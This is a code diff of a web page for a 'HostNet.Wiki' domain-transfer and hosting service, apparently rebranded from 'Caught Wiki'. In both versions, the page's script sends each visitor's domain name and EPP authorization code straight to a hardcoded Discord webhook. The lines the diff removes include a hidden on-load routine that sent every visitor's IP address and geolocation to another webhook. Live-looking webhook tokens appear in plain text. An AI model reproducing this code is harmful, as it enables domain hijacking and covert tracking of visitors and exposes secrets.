@@ -3,282 +3,177 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Caught Wiki - Secure and Innovative Hosting</title>
-  <meta name="description" content="Caught Wiki: Secure and innovative hosting solutions for your website and domain needs."/>
-  <meta property="og:title" content="Caught Wiki - Secure and Innovative Hosting" />
-  <meta property="og:description" content="Caught Wiki: Secure and innovative hosting solutions for your website and domain needs." />
+  <title>HostNet.Wiki - Secure & Innovative Web Hosting</title>
+  <meta name="description" content="HostNet.Wiki - Modern web hosting with support for custom domains, HTML uploads, and social embeds."/>
+  <meta property="og:title" content="HostNet.Wiki - Secure & Innovative Web Hosting" />
+  <meta property="og:description" content="HostNet.Wiki - Modern web hosting with support for custom domains, HTML uploads, and social embeds." />
   <meta property="og:image" content="https://example.com/logo.png" />
-  <meta property="og:image:type" content="image/png">
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-  <meta name="twitter:card" content="summary_large_image">
   <meta name="theme-color" content="#1E90FF" />
   <link rel="icon" href="https://example.com/favicon.ico" type="image/x-icon" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
   <style>
-    /* General Styles */
     body {
       font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #1e1e2f, #2a2a40);
-      color: #fff;
       margin: 0;
       padding: 0;
-      line-height: 1.6;
+      background: #0d1117;
+      color: #c9d1d9;
+    }
+    header {
+      background: #161b22;
+      padding: 1rem;
+      text-align: center;
+      border-bottom: 2px solid #ff4d4d;
     }
     .container {
       max-width: 800px;
-      margin: 0 auto;
-      padding: 20px;
-      text-align: center;
+      margin: auto;
+      padding: 2rem;
     }
     h1 {
-      font-size: 2.5rem;
-      font-weight: bold;
-      color: #1E90FF;
-      margin-bottom: 10px;
+      color: #58a6ff;
     }
     p {
-      font-size: 1rem;
-      color: rgba(255, 255, 255, 0.8);
-      margin-bottom: 20px;
+      line-height: 1.6;
     }
-
-    header {
-      background: #111;
-      padding: 1rem;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      border-bottom: 2px solid #ff4d4d;
+    ul, ol {
+      padding-left: 1.5rem;
     }
-    header .logo {
-      font-size: 1.8rem;
-      font-weight: bold;
-      letter-spacing: 3px;
-      color: #ff4d4d;
-      text-transform: uppercase;
+    .form-group {
+      margin-bottom: 1rem;
     }
-
-    .backend-status {
-      margin-top: 2rem;
-      font-size: 1.2rem;
-      color: #6bff6b;
-    }
-    .backend-status.offline {
-      color: #ff1a1a;
-    }
-
-    .free-hosting,
-    .instructions,
-    .transfer-form {
-      margin-top: 2rem;
-      padding: 1.5rem;
-      background-color: #1a1a1a;
-      border: 1px solid #ff4d4d;
-      border-radius: 5px;
-      text-align: left;
-      color: #ccc;
-    }
-
-    .free-hosting h3,
-    .instructions h3,
-    .transfer-form h2,
-    .transfer-form h3 {
-      color: #ff6b6b;
-    }
-
-    .transfer-form label {
+    label {
       display: block;
       margin-bottom: 0.5rem;
+      font-weight: 600;
     }
-
-    .transfer-form input,
-    .transfer-form select,
-    .transfer-form button {
+    input[type="text"],
+    input[type="file"],
+    select,
+    textarea {
       width: 100%;
-      padding: 10px;
-      margin-bottom: 1rem;
+      padding: 0.75rem;
+      background: #21262d;
       border: none;
       border-radius: 5px;
-      background-color: #111;
-      color: #ccc;
-    }
-
-    .transfer-form input[type="file"] {
-      background-color: transparent;
-      color: #ccc;
-      cursor: pointer;
-    }
-
-    .transfer-form button {
-      background-color: #ff1a1a;
       color: #fff;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .transfer-form button:hover {
-      background-color: #ff4d4d;
-    }
-
-    footer {
-      margin-top: 30px;
-      font-size: 0.9rem;
-      color: rgba(255, 255, 255, 0.6);
-    }
-
-    footer a {
-      color: #1E90FF;
-      text-decoration: none;
-    }
-
-    .share-button {
-      background-color: rgba(255, 255, 255, 0.1);
-      color: #fff;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
       font-size: 1rem;
-      transition: all 0.3s ease;
-      margin: 20px auto;
-      display: inline-block;
     }
-
-    .share-button:hover {
-      background-color: rgba(255, 255, 255, 0.2);
-      transform: translateY(-2px);
+    button {
+      background-color: #ff4d4d;
+      color: white;
+      border: none;
+      padding: 0.75rem 1.5rem;
+      font-size: 1rem;
+      border-radius: 5px;
+      cursor: pointer;
     }
-
-    .links {
-      margin-top: 20px;
+    button:hover {
+      background-color: #ff1a1a;
     }
-
-    .links a {
-      display: inline-block;
-      margin: 5px;
-      color: #ff4d4d;
-      text-decoration: none;
+    .status {
+      margin-top: 1rem;
       font-weight: bold;
     }
-
-    .links a:hover {
-      text-decoration: underline;
+    .success {
+      color: #6bff6b;
+    }
+    .error {
+      color: #ff1a1a;
+    }
+    footer {
+      text-align: center;
+      padding: 1rem;
+      font-size: 0.9rem;
+      color: #8b949e;
+      margin-top: 2rem;
     }
   </style>
 </head>
 <body>
-  <!-- Header -->
+
   <header>
-    <div class="logo">C A U G H T . W I K I</div>
+    <h1>HostNet.Wiki</h1>
+    <p>Secure & Innovative Web Hosting</p>
   </header>
 
-  <!-- Main Content -->
   <div class="container">
-    <h1>Welcome to Caught Wiki</h1>
-    <p>Secure and innovative hosting solutions for your website and domain needs.</p>
 
     <!-- Backend Status -->
-    <div class="backend-status" id="backendStatus">Checking backend status...</div>
+    <div id="backendStatus">Checking backend status...</div>
 
-    <!-- Free Hosting Section -->
-    <div class="free-hosting">
-      <h3>Free Hosting</h3>
-      <p>Do you want a website with a custom domain or don't know how to code or can't host? If you submit your domain to us and give us a reason, we will set up and publish your website.</p>
-    </div>
+    <!-- Hosting Info -->
+    <section>
+      <h2>Domain Transfer</h2>
+      <p>If you'd like to transfer your domain to us, please fill out the form below.</p>
+    </section>
 
-    <!-- Instructions Section -->
-    <div class="instructions">
-      <h3>How Domain Transfers Work</h3>
-      <p>If you'd like to transfer your domain to us, here's how it works:</p>
-      <ol>
-        <li><strong>Unlock Your Domain</strong>: Log in to your current registrar's account and unlock the domain you wish to transfer.</li>
-        <li><strong>Obtain the Authorization Code</strong>: Request the EPP/Authorization Code from your registrar. This code is required to authorize the transfer.</li>
-        <li><strong>Submit Your Details Below</strong>: Fill out the form with your domain name, authorization code, and the reason for the transfer.</li>
-        <li><strong>Approval Email</strong>: After submission, you'll receive an email from your current registrar asking you to approve the transfer. Please approve it promptly.</li>
-        <li><strong>Transfer Completion</strong>: Once approved, the transfer process typically takes 5–7 days to complete. During this time, your domain will remain active with your current registrar.</li>
-      </ol>
-      <p>If you have any questions or need assistance, feel free to <a href="mailto:hq@caught.wiki" style="color: #ff4d4d;">contact us</a>.</p>
-    </div>
-
-    <!-- Transfer Form -->
-    <div class="transfer-form">
+    <!-- Submission Form -->
+    <section>
       <h2>Transfer a Domain to Us</h2>
       <p>Please provide the required information below. All fields are mandatory.</p>
       <form id="transferForm" enctype="multipart/form-data">
-        <label for="domainName">Domain Name</label>
-        <input type="text" id="domainName" name="domainName" placeholder="example.com" required>
+        <div class="form-group">
+          <label for="domainName">Domain Name</label>
+          <input type="text" id="domainName" name="domainName" placeholder="example.com" required>
+        </div>
 
-        <label for="authCode">Authorization Code (EPP Code)</label>
-        <input type="text" id="authCode" name="authCode" placeholder="Your EPP/Auth Code" required pattern="[A-Za-z0-9\-]+">
+        <div class="form-group">
+          <label for="authCode">Authorization Code (EPP Code)</label>
+          <input type="text" id="authCode" name="authCode" placeholder="Your EPP/Auth Code" required pattern="[A-Za-z0-9\-]+" title="Authorization code must be alphanumeric with optional dashes.">
+        </div>
 
-        <label for="reasonSelect">Reason for Transfer (Predefined)</label>
-        <select id="reasonSelect" name="reasonSelect" required>
-          <option value="">-- Select a Reason --</option>
-          <option value="Image Hosting">Image Hosting</option>
-          <option value="Redirect">Redirect to Caught.Wiki or Other Domain</option>
-          <option value="Other">Other (Please Specify Below)</option>
-        </select>
+        <div class="form-group">
+          <label for="reasonSelect">Reason for Transfer (Predefined)</label>
+          <select id="reasonSelect" name="reasonSelect" required>
+            <option value="">-- Select a Reason --</option>
+            <option value="Image Hosting">Image Hosting</option>
+            <option value="Redirect">Redirect to Another Site</option>
+            <option value="Other">Other (Please Specify Below)</option>
+          </select>
+        </div>
 
-        <div id="imageUploadField" style="display: none;">
+        <div class="form-group" id="imageUploadField" style="display: none;">
           <label for="images">Upload Images (Up to 5 files, 10MB each)</label>
-          <input type="file" id="images" name="images" multiple accept="image/*">
+          <input type="file" id="images" name="images" multiple accept="image/*" required>
         </div>
 
-        <div id="redirectField" style="display: none;">
-          <label for="redirectDomain">Redirect Domain (e.g., caught.wiki or other domain)</label>
-          <input type="text" id="redirectDomain" name="redirectDomain" placeholder="caught.wiki or other domain">
+        <div class="form-group" id="redirectField" style="display: none;">
+          <label for="redirectDomain">Redirect Domain (e.g., hostnet.wiki or other domain)</label>
+          <input type="text" id="redirectDomain" name="redirectDomain" placeholder="hostnet.wiki or other domain">
         </div>
 
-        <label for="customReason">Custom Reason (Required if "Other" is selected)</label>
-        <input type="text" id="customReason" name="customReason" placeholder="Type your reason here">
+        <div class="form-group">
+          <label for="customReason">Custom Reason (Required if "Other" is selected)</label>
+          <input type="text" id="customReason" name="customReason" placeholder="Type your reason here">
+        </div>
 
         <button type="submit">Submit</button>
         <p id="formMessage"></p>
       </form>
-    </div>
-
-    <!-- Share Button -->
-    <button class="share-button" id="share-button">Share</button>
-
-    <!-- Links Section -->
-    <div class="links">
-      <a href="https://tiktok.com/@ceosolace" target="_blank">TikTok</a>
-      <a href="#" target="_blank">Twitter (Coming Soon)</a>
-      <a href="https://discord.com/users/ceosolace" target="_blank">Discord: @ceosolace</a>
-      <a href="#" target="_blank">YouTube Channel (Coming Soon)</a>
-      <a href="https://github.com/tfssolacedev/" target="_blank">GitHub Profile</a>
-    </div>
+    </section>
   </div>
 
-  <!-- Footer -->
   <footer>
-    <div class="container">
-      © 2025 Catch Wiki. All rights reserved. 
-      <a href="#">Privacy Policy</a> | 
-      <a href="#">Terms of Service</a>
-    </div>
+    &copy; 2025 HostNet.Wiki. All rights reserved. |
+    <a href="#" style="color:#58a6ff;">Privacy Policy</a> |
+    <a href="#" style="color:#58a6ff;">Terms of Service</a>
   </footer>
 
-  <!-- JavaScript -->
   <script>
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1362428754458181874/TaKeGN5i6l1gnWViBJVrem9jw2yonAxy0_PunlyYcXlwMlhj57tYmogtM7QuXgKj9gPE';
-    const IMGUR_CLIENT_ID = '919e66780dffebb';
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1369719012371726437/6aJepWKi1QDCRySfi4RJsKAFv6xLmyoVmIXYIMe7TjVMYQhDlIMqxsWw6Il8U9kYteHI';
+    const IMGUR_CLIENT_ID = '919e66780dffebb'; // Replace with your own if needed
 
     async function checkBackendStatus() {
-      const backendStatusElement = document.getElementById("backendStatus");
       try {
-        const response = await fetch("https://caughtwiki-backend.onrender.com/api/status");
-        if (response.ok) {
-          const data = await response.json();
-          backendStatusElement.textContent = `Backend is ${data.status}`;
-          backendStatusElement.classList.remove("offline");
+        const res = await fetch("https://hostnet-backend.onrender.com/status");
+        if (res.ok) {
+          document.getElementById("backendStatus").innerHTML = "Backend is <span class='status success'>online</span>";
         } else {
-          throw new Error("Offline");
+          throw new Error();
         }
-      } catch (error) {
-        backendStatusElement.textContent = "Backend is offline";
-        backendStatusElement.classList.add("offline");
+      } catch {
+        document.getElementById("backendStatus").innerHTML = "Backend is <span class='status error'>offline</span>";
       }
     }
 
@@ -340,21 +235,21 @@
 
       if (!domainName || !authCode || !reasonSelect) {
         formMessage.textContent = 'Please fill out all required fields.';
-        formMessage.style.color = '#ff1a1a';
+        formMessage.className = 'error';
         return;
       }
 
       if (reasonSelect === 'Redirect') {
         if (!redirectDomain) {
           formMessage.textContent = 'You must specify a redirect domain if "Redirect" is selected.';
-          formMessage.style.color = '#ff1a1a';
+          formMessage.className = 'error';
           return;
         }
         reason = `Redirect to ${redirectDomain}`;
       } else if (reasonSelect === 'Other') {
         if (!customReason) {
           formMessage.textContent = 'You must specify a custom reason if "Other" is selected.';
-          formMessage.style.color = '#ff1a1a';
+          formMessage.className = 'error';
           return;
         }
         reason = customReason;
@@ -368,20 +263,22 @@
         const files = document.getElementById('images').files;
         if (files.length === 0) {
           formMessage.textContent = 'You must upload at least one image for image hosting.';
-          formMessage.style.color = '#ff1a1a';
+          formMessage.className = 'error';
           return;
         }
+
         for (const file of files) {
           if (file.size > 10 * 1024 * 1024) {
             formMessage.textContent = `File "${file.name}" exceeds the 10MB size limit.`;
-            formMessage.style.color = '#ff1a1a';
+            formMessage.className = 'error';
             return;
           }
         }
+
         imageUrls = await uploadImagesToImgur(files);
         if (!imageUrls) {
           formMessage.textContent = 'Failed to upload images. Please try again later.';
-          formMessage.style.color = '#ff1a1a';
+          formMessage.className = 'error';
           return;
         }
       }
@@ -397,13 +294,14 @@
               { name: 'Authorization Code', value: authCode, inline: true },
               { name: 'Reason for Transfer', value: reason, inline: false }
             ],
-            footer: { text: 'CaughtWiki Domain Transfers' },
+            footer: { text: 'HostNet.Wiki Domain Transfers' },
             timestamp: new Date().toISOString()
           }
         ]
       };
 
       if (imageUrls.length > 0) {
+        payload.embeds[0].image = { url: imageUrls[0] };
         payload.embeds[0].fields.push({ name: 'Uploaded Images', value: imageUrls.join('\n'), inline: false });
       }
 
@@ -416,72 +314,22 @@
 
         if (response.ok) {
           formMessage.textContent = 'Transfer request submitted successfully!';
-          formMessage.style.color = '#6bff6b';
+          formMessage.className = 'success';
           document.getElementById('transferForm').reset();
-          window.location.href = 'https://discord.gg/caughtwiki';
+          setTimeout(() => window.location.href = 'https://discord.gg/caughtwiki', 1500);
         } else {
           formMessage.textContent = 'Failed to submit transfer request. Please try again later.';
-          formMessage.style.color = '#ff1a1a';
+          formMessage.className = 'error';
         }
       } catch (error) {
         console.error('Error submitting form:', error);
         formMessage.textContent = 'An error occurred. Please try again later.';
-        formMessage.style.color = '#ff1a1a';
+        formMessage.className = 'error';
       }
     });
 
-    // Send IP + Whois info on load
-    async function sendIPAndWhois() {
-      try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const whoisRes = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
-        const whoisData = await whoisRes.json();
-
-        const webhookUrl = 'https://discord.com/api/webhooks/1364333839631122573/01wis4woFMsU8MFiKj4lhOXbBaRhwgPTJ02MDPs6qtAzQuTLBvNOsphEccZHb-XpVy7j';
-
-        const payload = {
-          embeds: [{
-            title: "Visitor Info",
-            color: 16711680,
-            fields: [
-              { name: "IP Address", value: whoisData.ip || "N/A", inline: true },
-              { name: "City", value: whoisData.city || "N/A", inline: true },
-              { name: "Region", value: whoisData.region || "N/A", inline: true },
-              { name: "Country", value: whoisData.country || "N/A", inline: true },
-              { name: "Location", value: whoisData.loc || "N/A", inline: true },
-              { name: "Organization", value: whoisData.org || "N/A", inline: true },
-              { name: "Hostname", value: whoisData.hostname || "N/A", inline: true }
-            ]
-          }]
-        };
-
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-
-        console.log('Visitor info sent to Discord.');
-      } catch (error) {
-        console.error('Error sending visitor info:', error);
-      }
-    }
-
-    window.onload = () => {
-      checkBackendStatus();
-      sendIPAndWhois();
-      document.getElementById('share-button').addEventListener('click', () => {
-        if (navigator.share) {
-          navigator.share({
-            title: 'Catch Wiki - Secure and Innovative Hosting',
-            url: window.location.href,
-          }).catch((error) => console.error('Error sharing:', error));
-        } else {
-          alert('Sharing is not supported in this browser.');
-        }
-      });
-    };
+    window.addEventListener("load", checkBackendStatus);
   </script>
+
 </body>
 </html>
